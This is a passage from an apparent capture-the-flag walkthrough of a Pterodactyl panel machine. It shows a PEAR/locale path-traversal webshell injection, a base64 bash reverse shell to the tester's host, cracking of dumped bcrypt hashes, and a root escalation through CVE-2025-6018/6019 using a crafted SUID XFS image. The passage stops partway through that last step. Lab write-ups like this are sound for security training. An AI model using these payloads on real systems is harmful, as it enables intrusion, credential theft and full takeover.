PEAR Installer temp directory  temp_dir         /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/temp
PEAR test directory            test_dir         /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/tests
PEAR www files directory       www_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/www
Cache TimeToLive               cache_ttl        <not set>
Preferred Package State        preferred_state  <not set>
Unix file mask                 umask            <not set>
Debug Log Level                verbose          <not set>
PEAR password (for             password         <not set>
maintainers)
Signature Handling Program     sig_bin          <not set>
Signature Key Directory        sig_keydir       <not set>
Signature Key Id               sig_keyid        <not set>
Package Signature Type         sig_type         <not set>
PEAR username (for             username         <not set>
maintainers)
User Configuration File        Filename         /tmp/shell.php
System Configuration File      Filename         #no#system#config#
Successfully created default configuration file "/tmp/shell.php"
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Server Error</title>

        <style>
            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}code{font-family:monospace,monospace;font-size:1em}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}code{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-gray-400{--border-opacity:1;border-color:#cbd5e0;border-color:rgba(203,213,224,var(--border-opacity))}.border-t{border-top-width:1px}.border-r{border-right-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-xl{max-width:36rem}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.uppercase{text-transform:uppercase}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.tracking-wider{letter-spacing:.05em}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}}
        </style>

        <style>
            body {
                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            }
        </style>
    </head>
    <body class="antialiased">
        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0">
            <div class="max-w-xl mx-auto sm:px-6 lg:px-8">
                <div class="flex items-center pt-8 sm:justify-start sm:pt-0">
                    <div class="px-4 text-lg text-gray-500 border-r border-gray-400 tracking-wider">
                        500                    </div>

                    <div class="ml-4 text-lg text-gray-500 uppercase tracking-wider">
                        Server Error                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```

It generates the config file and it’s full of webshells.

I’ll trigger it, including the command as a GET parameter:

```console
oxdf@hacky$ curl -sg 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell&0=id'| head -3
#PEAR_Config 0.9
a:12:{s:7:"php_dir";s:97:"/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
uid=474(wwwrun) gid=477(www) groups=477(www)/pear/php";s:8:"data_dir";s:98:"/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/uid=474(wwwrun) gid=477(www) groups=477(www)
```

It worked!

#### Shell

I’ll make a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) and base64-encode it for ease of transfer:

```console
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQo=
oxdf@hacky$ echo 'bash -i  >& /dev/tcp/10.10.14.61/443 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzIDA+JjEK
oxdf@hacky$ echo 'bash -i  >& /dev/tcp/10.10.14.61/443  0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxCg==
oxdf@hacky$ echo 'bash -i  >& /dev/tcp/10.10.14.61/443  0>&1 ' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxIAo=
oxdf@hacky$ echo 'bash -i  >& /dev/tcp/10.10.14.61/443  0>&1  ' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICAK
```

I keep adding spaces until there are no special characters to reducec potential issues. Now I can send that to the webshell:

```console
oxdf@hacky$ curl -sg 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell' -G --data-urlencode '0=echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICAK | base64 -d | bash'
```

It hangs, but at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.64.117 36096
bash: cannot set terminal process group (1227): Inappropriate ioctl for device
bash: no job control in this shell
wwwrun@pterodactyl:/var/www/pterodactyl/public>
```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
wwwrun@pterodactyl:/var/www/pterodactyl/public> script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
wwwrun@pterodactyl:/var/www/pterodactyl/public> ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
wwwrun@pterodactyl:/var/www/pterodactyl/public>
```

## Shell as phileasfogg3

### Enumeration

#### OS

The machine is actually running openSUSE:

```console
wwwrun@pterodactyl:/> cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.6"
ID="opensuse-leap"
ID_LIKE="suse opensuse"
VERSION_ID="15.6"
PRETTY_NAME="openSUSE Leap 15.6"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:opensuse:leap:15.6"
BUG_REPORT_URL="https://bugs.opensuse.org"
HOME_URL="https://www.opensuse.org/"
DOCUMENTATION_URL="https://en.opensuse.org/Portal:Leap"
LOGO="distributor-logo-Leap"
```

That explains why the versions during `nmap` enumeration didn’t match cleanly to an OS I’ve documented. I don’t know that there’s a clean mapping of versions to OS versions for openSUSE.

This version should be vulnerable to two recent Linux LPE bugs, [CopyFail](https://copy.fail/) and [DirtyFrag](https://github.com/V4bel/dirtyfrag). I’ll dig into both in Beyond Root.

#### Users

There are two users with home directories in `/home`:

```console
wwwrun@pterodactyl:/home> ls
headmonitor  phileasfogg3
```

Those two users, root, and the nobody user have shells configured:

```console
wwwrun@pterodactyl:/> cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
headmonitor:x:1001:100::/home/headmonitor:/bin/bash
phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
```

nobody having a shell is common on openSUSE.

wwwrun has access to phileasfogg3’s home directory because it is world readable:

```console
wwwrun@pterodactyl:/home/phileasfogg3> ls -la
total 24
drwxr-xr-x 1 phileasfogg3 users  156 Dec 31 17:29 .
drwxr-xr-x 1 root         root    46 Nov  7  2025 ..
lrwxrwxrwx 1 root         root     9 Dec 31 17:29 .bash_history -> /dev/null
-rw-r--r-- 1 phileasfogg3 users 1177 Aug 22  2024 .bashrc
drwx------ 1 phileasfogg3 users    0 Mar 15  2022 .cache
drwx------ 1 phileasfogg3 users    0 Mar 15  2022 .config
-rw-r--r-- 1 phileasfogg3 users 1637 Apr  9  2018 .emacs
drwxr-xr-x 1 phileasfogg3 users    0 Mar 15  2022 .fonts
-rw-r--r-- 1 phileasfogg3 users  861 Apr  9  2018 .inputrc
drwx------ 1 phileasfogg3 users    0 Mar 15  2022 .local
-rw-r--r-- 1 phileasfogg3 users 1028 Aug 22  2024 .profile
drwxr-xr-x 1 phileasfogg3 users    0 Mar 15  2022 bin
-rw-r--r-- 1 root         root    33 May 10 20:36 user.txt
```

I’ll grab `user.txt`:

```console
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt
3e5811ea************************
```

There’s nothing else really interesting here.

#### Web

The Nginx site configurations are in `/etc/nginx/conf.d`:

```console
wwwrun@pterodactyl:/> ls /etc/nginx/conf.d/
00-site.conf  01-pterodactyl.conf
```

`00-site.conf` has the redirect to `pterodactyl.htb`, and a proxy to PHP based from `/var/www/html`:

```nginx
server {
    listen 80;
    server_name pterodactyl.htb;

    root /var/www/html;
    index index.php;

    if ($host != pterodactyl.htb) {
        rewrite ^ http://pterodactyl.htb/;
    }

    location / {
        try_files $uri $uri/ =404;
    }

    # PHP handling block goes here
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass 127.0.0.1:9000;    # TCP endpoint of PHP-FPM
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    location ~ /\.ht {
        deny all;
    }

}
```

There’s nothing too interesting in `html`.

The config for `01-pterodactyl.conf` shows it’s running PHP from `/var/www/pterodactyl/public`:

```nginx
server {
    listen 80;
    server_name panel.pterodactyl.htb;

    root /var/www/pterodactyl/public;
    index index.html index.htm index.php;
    charset utf-8;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    # PHP handling block goes here
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass 127.0.0.1:9000;    # TCP endpoint of PHP-FPM
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    access_log off;
    error_log  /var/log/nginx/pterodactyl.app-error.log error;

    # allow larger file uploads and longer script runtimes
    client_max_body_size 100m;
    client_body_timeout 120s;

    sendfile off;

    location ~ /\.ht {
        deny all;
    }
}
```

This also looks like a vanilla install of Pterodactyl:

```console
wwwrun@pterodactyl:/var/www/pterodactyl> ls
BUILDING.md   artisan          docker-compose.example.yml  storage
CHANGELOG.md  babel.config.js  jest.config.js              tailwind.config.js
Dockerfile    bootstrap        package.json                tsconfig.json
LICENSE.md    composer.json    postcss.config.js           vendor
README.md     composer.lock    public                      webpack.config.js
SECURITY.md   config           resources                   yarn.lock
app           database         routes
```

As I noted above, the database config is in `config/database.php`. The same username and password are in the `.env` file:

```console
wwwrun@pterodactyl:/var/www/pterodactyl> cat .env
APP_ENV=production
APP_DEBUG=false
APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
APP_THEME=pterodactyl
APP_TIMEZONE=UTC
APP_URL="http://panel.pterodactyl.htb"
APP_LOCALE=en
APP_ENVIRONMENT_ONLY=false

LOG_CHANNEL=daily
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

CACHE_DRIVER=redis
QUEUE_CONNECTION=redis
SESSION_DRIVER=redis

HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
HASHIDS_LENGTH=8

MAIL_MAILER=smtp
MAIL_HOST=smtp.example.com
MAIL_PORT=25
MAIL_USERNAME=
MAIL_PASSWORD=
MAIL_ENCRYPTION=tls
MAIL_FROM_ADDRESS=no-reply@example.com
MAIL_FROM_NAME="Pterodactyl Panel"
# You should set this to your domain to prevent it defaulting to 'localhost', causing
# mail servers such as Gmail to reject your mail.
#
# @see: https://github.com/pterodactyl/panel/pull/3110
# MAIL_EHLO_DOMAIN=panel.example.com

APP_SERVICE_AUTHOR="pterodactyl@pterodactyl.htb"
PTERODACTYL_TELEMETRY_ENABLED=false
RECAPTCHA_ENABLED=false
```

#### Database

I’ll connect to the database using the creds from the config / `.env` file:

```console
wwwrun@pterodactyl:/var/www/pterodactyl> mariadb -u pterodactyl -pPteraPanel -h 127.0.0.1 panel
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2733
Server version: 11.8.3-MariaDB MariaDB package

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [panel]>
```

The instance has three dbs:

```console
MariaDB [panel]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| panel              |
| test               |
+--------------------+
3 rows in set (0.001 sec)
```

`test` is empty and `information_schema` is default.

`panel` has 35 tables:

```console
MariaDB [panel]> show tables;
+-----------------------+
| Tables_in_panel       |
+-----------------------+
| activity_log_subjects |
| activity_logs         |
| allocations           |
| api_keys              |
| api_logs              |
| audit_logs            |
| backups               |
| database_hosts        |
| databases             |
| egg_mount             |
| egg_variables         |
| eggs                  |
| failed_jobs           |
| jobs                  |
| locations             |
| migrations            |
| mount_node            |
| mount_server          |
| mounts                |
| nests                 |
| nodes                 |
| notifications         |
| password_resets       |
| recovery_tokens       |
| schedules             |
| server_transfers      |
| server_variables      |
| servers               |
| sessions              |
| settings              |
| subusers              |
| tasks                 |
| tasks_log             |
| user_ssh_keys         |
| users                 |
+-----------------------+
35 rows in set (0.000 sec)
```

`user_ssh_keys` is empty. The most interesting table is `users`, where there are two entries:

```console
MariaDB [panel]> select * from users;
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
2 rows in set (0.000 sec)
```

I can get just the hashes:

```console
MariaDB [panel]> select username,password from users;
+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+--------------+--------------------------------------------------------------+
2 rows in set (0.000 sec)
```

### Shell

#### Crack Hashes

I’ll save both hashes to a file. These are bcrypt hashes, so they will be very slow to crack, but one of them cracks within a minute or so on my machine:

```console
$ hashcat -m 3200 hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting
...[snip]...
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
...[snip]...
```

That’s the hash for phileasfogg3, who is a user on the box.

#### su / SSH

That password works for `su` to escalate to phileasfogg3:

```console
wwwrun@pterodactyl:/var/www/pterodactyl> su - phileasfogg3
Password:
phileasfogg3@pterodactyl:~>
```

It also works for SSH:

```console
oxdf@hacky$ sshpass -p '!QAZ2wsx' ssh phileasfogg3@pterodactyl.htb
Have a lot of fun...
Last login: Mon May 11 17:56:18 2026 from 10.10.14.61
phileasfogg3@pterodactyl:~>
```

## Shell as root

### Enumeration

#### sudo

The `sudo -l` output is a bit different from what typically comes on an Ubuntu or Debian system:

```console
phileasfogg3@pterodactyl:~> sudo -l
[sudo] password for phileasfogg3:
Matching Defaults entries for phileasfogg3 on pterodactyl:
    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS
    XDG_SESSION_COOKIE", !insults, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw

User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL
```

While this looks exciting, it effectively says that this user can run any command as any user, but the `targetpw` directive means that I need that target user’s password to do so. This is the default configuration for openSUSE.

So if I try to run `sudo su -`, it prompts for the root user’s password:

```console
phileasfogg3@pterodactyl:~> sudo su -
[sudo] password for root:
```

Effectively this is nothing, as if I get any of these passwords, I can just `su`.

#### Mail

`/var/spool/mail/phileasfogg3` has an email to this user from the system administrator:

/var/spool/mail/phileasfogg3

[ N 1/1 ]

From:

headmonitor <headmonitor@pterodactyl>

Delivered-To:

phileasfogg3@pterodactyl

Received:

by pterodactyl (Postfix, from userid 0) id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)

To:

All Users <all@pterodactyl>

Subject:

SECURITY NOTICE: Unusual udisksd activity (stay alert)

Message-ID:

202511070915.headmonitor@pterodactyl

Date:

Fri, 07 Nov 2025 09:15:00 +0100

MIME-Version:

1.0

Content-Type:

text/plain; charset="utf-8"

Content-Transfer-Encoding:

7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor System Administrator

q:quit r:reply i:index d:delete ?:help

This is a good hint to look at plugging in USB devices. `udisksd` is the userspace daemon (part of `udisks2`) that manages storage on Linux by auto-mounting removable media, handling LUKS volumes, querying SMART data. It runs as root and exposes its interface over D-Bus. A flaw in how it parses filesystem metadata or labels on attacker-supplied media would lead to root code execution, which is exactly the attack surface the email’s “unusual udisksd activity” points to.

### Escalation via Two CVEs

#### CVE Identification

Searching for “udisksd cve” returns hits focused around two CVEs:

![image-20260511153443682](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260511153443682.png)

CVE-2025-8067 is an out-of-bounds read in udisks2’s `LoopSetup` D-Bus handler that leaks file descriptors from the root-owned daemon, letting an unprivileged caller map them onto a loop device to read root-owned files. It’s reachable here, but only after first using CVE-2025-6018 to get past polkit (SSH sessions can’t call `LoopSetup` on their own), and even then it just gives me an arbitrary file-read on whichever FD the daemon happened to have open. There’s a potential path to root here, but I’m going to use CVE-2025-6019.

#### CVE Background

There’s actually two CVEs here. [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018):

> A Local Privilege Escalation (LPE) vulnerability has been discovered in pam-config within Linux Pluggable Authentication Modules (PAM). This flaw allows an unprivileged local attacker (for example, a user logged in via SSH) to obtain the elevated privileges normally reserved for a physically present, “allow_active” user. The highest risk is that the attacker can then perform all allow_active yes Polkit actions, which are typically restricted to console users, potentially gaining unauthorized control over system configurations, services, or other sensitive operations.

Basically this allows me to bypass protections that would have required a session from a physical keyboard rather than remote like SSH.

Once I have that, I can abuse [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019):

> A Local Privilege Escalation (LPE) vulnerability was found in libblockdev. Generally, the “allow_active” setting in Polkit permits a physically present user to take certain actions based on the session type. Due to the way libblockdev interacts with the udisks daemon, an “allow_active” user on a system may be able escalate to full root privileges on the target host. Normally, udisks mounts user-provided filesystem images with security flags like nosuid and nodev to prevent privilege escalation. However, a local attacker can create a specially crafted XFS image containing a SUID-root shell, then trick udisks into resizing it. This mounts their malicious filesystem with root privileges, allowing them to execute their SUID-root shell and gain complete control of the system.

Basically I can abuse `udisks` to mount a filesystem that will allow me access to a SetUID shell.

#### CVE-2025-6018

I’ll create a `.pam_environment` file in my current user’s home directory. polkit reads `XDG_SEAT` and `XDG_VTNR` to decide whether a session is on the physical console; declaring myself on seat 0 / VT 1 is what gets the SSH session past the `allow_active` check.

```console
phileasfogg3@pterodactyl:~> echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > .pam_environment
```

Now I’ll exit SSH and reconnect. On this connection, the `.pam_environment` file will be loaded. This reflects in my `env`:

```console
phileasfogg3@pterodactyl:~> env | grep XDG
XDG_VTNR=1
XDG_SESSION_ID=1901
XDG_SESSION_TYPE=tty
XDG_DATA_DIRS=/usr/share
XDG_SESSION_CLASS=user
XDG_SEAT=seat0
XDG_RUNTIME_DIR=/run/user/1002
XDG_CONFIG_DIRS=/etc/xdg
```

This is enough to bypass the `polkit` protection:

```console
phileasfogg3@pterodactyl:~> pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK
POLKIT_OK
```

#### CVE-2025-6019

I’m going to make a malicious image, but I’ll need a copy of the `bash` binary from target as `glibc`, `libtinfo`, and other shared libraries are linked at runtime, and this is a different OS than I am running. I’ll grab it with `scp`:

```console
oxdf@hacky$ sshpass -p '!QAZ2wsx' scp phileasfogg3@pterodactyl.htb:/usr/bin/bash .
```

Now I create the XFS image using the following flow:

1. Create a small empty image file (50–64 MB is plenty).
2. Format it as XFS with crc=0 (the target kernel is ~5.14; crc=0 keeps the image compatible with kernels that don’t support v5 superblocks, defensive).
3. Loopback-mount it locally.
4. Copy bash inside, chown root:root, chmod 4755.
5. Unmount.

I’ll create the image:

```console
oxdf@hacky$ sudo dd if=/dev/zero of=payload.img bs=1M count=512
512+0 records in
512+0 records out
536870912 bytes (537 MB, 512 MiB) copied, 6.16332 s, 87.1 MB/s
```

It must be at least 512 MB for the file system to fit, or the next step will fail. I’ll use `mkfs.xfs` (`apt install xfsprogs`) to turn that into an XFS image:

```console
oxdf@hacky$ sudo mkfs.xfs -m crc=0 -f payload.img
V4 filesystems are deprecated and will not be supported by future versions.
meta-data=payload.img            isize=256    agcount=4, agsize=32768 blks
         =                       sectsz=512   attr=2, projid32bit=1
         =                       crc=0        finobt=0, sparse=0, rmapbt=0
         =                       reflink=0    bigtime=0 inobtcount=0 nrext64=0
data     =                       bsize=4096   blocks=131072, imaxpct=25
         =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1
log      =internal log           bsize=4096   blocks=16384, version=2
         =                       sectsz=512   sunit=0 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
```

I’ll mount the filesystem, copy in `bash`, and make it SetUID:

```console
oxdf@hacky$ sudo mkdir /mnt/xfs
oxdf@hacky$ sudo mount -o loop payload.img /mnt/xfs/
oxdf@hacky$ sudo cp bash /mnt/xfs/rootbash
oxdf@hacky$ sudo chown root:root /mnt/xfs/rootbash
oxdf@hacky$ sudo chmod 6755 /mnt/xfs/rootbash
oxdf@hacky$ ls -l /mnt/xfs/rootbash
-rwsr-sr-x 1 root root 1012656 May 11 23:12 /mnt/xfs/rootbash
```

Now I’ll unmount the image:

```console
oxdf@hacky$ sudo umount /mnt/xfs
```

I’ll copy the image up to Pterodactyl:

```console
oxdf@hacky$ sshpass -p '!QAZ2wsx' scp payload.img phileasfogg3@pterodactyl.htb:/tmp/payload.img
```

Now I need to have `udisks2` set up a loop device on Pterodactyl:

```console
phileasfogg3@pterodactyl:~> udisksctl loop-setup -f /tmp/payload.img
Mapped file /tmp/payload.img as /dev/loop0.
```

That would have blocked if not for CVE-2025-6018.

Now I mount that device:

```console
phileasfogg3@pterodactyl:~> udisksctl mount -b /dev/loop0
Mounted /dev/loop0 at /run/media/phileasfogg3/d5a0c55e-7f38-471b-ba4b-ebe8d1851a66
```

That mounted, but it’s mounted `nosuid`:

```console
phileasfogg3@pterodactyl:~> mount | grep phil
